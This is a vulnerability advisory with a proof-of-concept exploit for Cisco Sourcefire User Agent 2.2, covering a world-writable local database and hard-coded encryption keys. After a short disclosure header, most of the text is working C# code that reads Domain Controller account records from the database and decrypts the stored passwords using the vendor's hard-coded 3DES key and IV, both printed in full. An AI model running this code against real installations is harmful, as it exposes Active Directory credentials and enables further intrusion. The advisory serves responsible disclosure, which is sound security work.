/* 
Cisco Sourcefire User Agent Insecure File Permissions Vulnerability
Vendor: Cisco
Product webpage: http://www.cisco.com
Affected version(s): 
	Cisco SF User Agent 2.2
Fixed version(s):
	Cisco SF User Agent 2.2-25
Date: 08/09/2015
Credits: Glafkos Charalambous
CVE: Not assigned by Cisco
BugId: CSCut44881

Disclosure Timeline:
18-03-2015: Vendor Notification
19-03-2015: Vendor Response/Feedback
01-09-2015: Vendor Fix/Patch
08-09-2015: Public Disclosure

Description: 
Sourcefire User Agent monitors Microsoft Active Directory servers and report logins and logoffs authenticated via LDAP. 
The FireSIGHT System integrates these records with the information it collects via direct network traffic observation by managed devices. 

Vulnerability:
Sourcefire User Agent is vulnerable to default insecure file permissions and hardcoded encryption keys.
A local attacker can exploit this by gaining access to user readable database file and extracting sensitive information.
In combination with hard-coded 3DES keys an attacker is able to decrypt configured Domain Controller accounts which can lead
to further attacks.

C:\Users\0x414141>icacls "C:\SourcefireUserAgent.sdf"
C:\SourcefireUserAgent.sdf BUILTIN\Administrators:(I)(F)
                           NT AUTHORITY\SYSTEM:(I)(F)
                           BUILTIN\Users:(I)(RX)
                           NT AUTHORITY\Authenticated Users:(I)(M)
                           Mandatory Label\High Mandatory Level:(I)(NW)

Successfully processed 1 files; Failed processing 0 files

*/

using System;
using System.Text;
using System.Security.Cryptography;
using System.Data.SqlServerCe;

namespace SFDecrypt
{
    class Program
    {

        static void Main(string[] args)
        {
            SqlCeConnection conn = null;
            try
            {
                string FileName = @"C:\SourcefireUserAgent.sdf";
                string ConnectionString = string.Format("DataSource=\"{0}\";Mode = Read Only;Temp Path =C:\\Windows\\Temp", FileName);
                conn = new SqlCeConnection(ConnectionString);
                string query = "Select host, domain, username, password FROM active_directory_servers";
                SqlCeCommand cmd = new SqlCeCommand(query, conn);
                conn.Open();
                SqlCeDataReader rdr = cmd.ExecuteReader();
                while (rdr.Read())
                {
                    string strHost = rdr.GetString(0);
                    string strDom = rdr.GetString(1);
                    string strUser = rdr.GetString(2);
                    string strPass = rdr.GetString(3);
                    Console.WriteLine("Host: " + strHost + " Domain: " + strDom + " Username: " + strUser + " Password: " + Decrypt.Decrypt3DES(strPass));
                }
                rdr.Close();
            }
            catch (Exception exception)
            {
                Console.Write(exception.ToString());
            }
            finally
            {
                conn.Close();
            }
        }
    }

    class Decrypt
    {
        public static string Decrypt3DES(string strEncrypted)
        {

            string strDecrypted = "";
            try
            {
                TripleDESCryptoServiceProvider provider = new TripleDESCryptoServiceProvider();
                provider.Key = Encoding.UTF8.GetBytes("50uR<3F1r3R0xDaH0u5eW0o+");
                provider.IV = Encoding.UTF8.GetBytes("53cUri+y");
                byte[] inputBuffer = Convert.FromBase64String(strEncrypted);
                byte[] bytes = provider.CreateDecryptor().TransformFinalBlock(inputBuffer, 0, inputBuffer.Length);
                strDecrypted = Encoding.Unicode.GetString(bytes);
            }
            catch (Exception exception)
            {
                Console.Write("Error Decrypting Data: " + exception.Message);
            }
            return strDecrypted;
        }
    }
}
 

References:
https://tools.cisco.com/bugsearch/bug/CSCut44881